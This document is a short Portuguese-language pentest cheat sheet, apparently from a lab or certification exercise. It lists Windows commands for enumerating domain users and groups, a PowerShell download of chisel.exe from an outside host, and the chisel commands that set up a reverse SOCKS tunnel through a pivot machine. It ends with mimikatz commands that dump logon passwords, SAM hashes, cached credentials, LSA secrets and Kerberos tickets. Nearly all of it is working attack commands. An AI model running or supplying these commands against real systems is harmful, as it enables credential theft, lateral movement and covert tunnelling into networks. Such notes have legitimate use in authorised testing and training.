
### .NET

Verificar usuários no domínio:

```
net user /domain
```

Verificar usuário específico no domínio:

```
net user jeffadmin /domain
```

Verificar grupos de domínio:

```
net group /domain
```

Verificar grupo específico do domínio:

```
net group "Sales Department" /domain
```


## CHISEL

Transferência de arquivo:

~~~~
powershell.exe wget http://192.168.45.216/chisel.exe -OutFile c:\Users\Public\chisel.exe
~~~~

Para Realizar o túnel, utilizei os seguintes comandos:

No kali:

```
chisel server -p 8080 --reverse
```

No pivo (Windows):

```
C:\Users\Public\chisel.exe client 192.168.45.203:8080 R:socks
```

### mimikatz


``` shell
## O que nos permitirá interagir com um processo de propriedade de outra conta
privilege::debug
token::elevate
## hashes para todos os usuários conectados no atual estação de trabalho
sekurlsa::logonpasswords
lsadump::sam
lsadump::cache
lsadump::secrets
sekurlsa::tickets /export
lsadump::lsa /patch

.\Tmimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
.\Tmimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" "lsadump::secrets" "exit"
```